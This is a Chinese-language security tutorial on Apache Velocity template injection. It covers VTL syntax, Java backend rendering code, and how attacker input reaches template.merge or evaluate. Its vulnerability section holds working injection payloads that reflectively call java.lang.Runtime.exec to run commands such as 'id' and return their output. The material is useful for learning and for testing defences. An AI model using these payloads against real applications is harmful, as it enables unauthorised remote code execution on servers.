### Velocity 基础

#### 模板页面

```html
<html>
<body>
Hello $customer.Name!
<table>
#foreach( $mud in $mudsOnSpecial )
#if ( $customer.hasPurchased($mud) )
<tr>
<td>
$flogger.getPromo( $mud )
</td>
</tr>
#end
#end
</table>
</body>
</html>
```

* Velocity模板语言（VTL，Velocity Template Language）：VTL 使用引用的方式将动态内容嵌入网站，所有 VTL 语句一样，以 # 字符开头并包含一个指令
* 变量：在 Velocity 模板语言中，变量使用 $ 符号来引用，例如 $variable_name 。变量可以引用 Java 对象， Map 中的键值对，以及其他的数据类型。比如上面示例模板文件中的 $mud ，可以获取通过上下文以及 后端传递获取 $mud 变量值。
* 方法：方法在 Java 代码中被定义，并且能够执行一些有用的操作。方法是由一个$字符开头的 VTL 标识符和 VTL 方法体组成的引用。VTL 方法体由一个 VTL 标识符、一个左括号字符(、一个可选参数列表、一个 右括号字符)组成。以下是VTL中有效的方法引用示例：

```java
$customer.getAddress()
$purchase.getTotal()
$page.setTitle( "My Home Page" )
$person.setAttributes( ["Strange", "Weird", "Excited"] )
```

* set指令：\#set 指令用于设置引用的值。一个值可以被赋给一个变量引用或一个属性引用，并且这发生在括号中， 就像下面所示的示例一样

```java
#set( $primate = "monkey" )
#set( $customer.Behavior = $primate )
```

  赋值语句的左侧必须是一个变量引用或一个属性引用。右侧可以是以下类型之一：变量引用 字符串字面量 属性引用 方法引用 数字字面量 ArrayList Map

```java
#set( $monkey = $bill ) ## variable reference
#set( $monkey.Friend = "monica" ) ## string literal
#set( $monkey.Blame = $whitehouse.Leak ) ## property reference
#set( $monkey.Plan = $spindoctor.weave($web) ) ## method reference
#set( $monkey.Number = 123 ) ##number literal
#set( $monkey.Say = ["Not", $my, "fault"] ) ## ArrayList
#set( $monkey.Map = {"banana" : "good", "roast beef" : "bad"}) ## Map

```

#### 后端与模板交互

* 按模板路径取得模板，传入参数，使用template.merge(context, writer);触发payload

```java
import org.apache.velocity.Template;
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;

import java.io.StringWriter;

public class VelocityExample {

    public static void main(String[] args) {
        // 初始化Velocity引擎
        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.init();

        // 获取Velocity模板
        Template template = velocityEngine.getTemplate("path/to/template.vm");

        // 准备数据模型
        VelocityContext context = new VelocityContext();
        context.put("name", "John Doe");

        // 填充模板并获取生成的输出
        StringWriter writer = new StringWriter();
        template.merge(context, writer);
        String output = writer.toString();

        // 打印生成的HTML输出
        System.out.println(output);
    }
}
```

* 后端代码生成 模板字符串，velocityEngine.evaluate(context, writer, "logTag", templateString);触发payload

```java
import org.apache.velocity.VelocityContext;
import org.apache.velocity.app.VelocityEngine;

import java.io.StringWriter;

public class VelocityEvaluateExample {

    public static void main(String[] args) {
        // 初始化Velocity引擎
        VelocityEngine velocityEngine = new VelocityEngine();
        velocityEngine.init();

        // 准备数据模型
        VelocityContext context = new VelocityContext();
        context.put("name", "John Doe");

        // 模板字符串
        String templateString = "<h1>Hello, $name!</h1>";

        // 评估模板字符串
        StringWriter writer = new StringWriter();
        velocityEngine.evaluate(context, writer, "logTag", templateString);

        // 获取生成的输出
        String output = writer.toString();

        // 打印生成的HTML输出
        System.out.println(output);
    }
}
```

### 漏洞产生

#### set指令攻击语句

```java
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",nu
ll).invoke(null,null).exec("calc")
```

```java
#set($x='')##
#set($rt = $x.class.forName('java.lang.Runtime'))##
#set($chr = $x.class.forName('java.lang.Character'))##
#set($str = $x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('id'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach( $i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

```java
#set ($e="exp")
#set
($a=$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invok
e(null,null).exec($cmd))
#set
($input=$e.getClass().forName("java.lang.Process").getMethod("getInputStream").in
voke($a))
#set($sc = $e.getClass().forName("java.util.Scanner"))
#set($constructor =
$sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
#set($scan=$constructor.newInstance($input).useDelimiter("\A"))
#if($scan.hasNext())
$scan.next()
#end
```

#### payload的传入

* template.merge需要引用的模板我们可控，在可控模板中插入攻击语句即可
* velocityEngine.evaluate需要我们从与templateString对应的参数传入payload

### 漏洞修复

* Velocity 小于等于 2.2 版本存在模板注入漏洞
* 更换高版本即可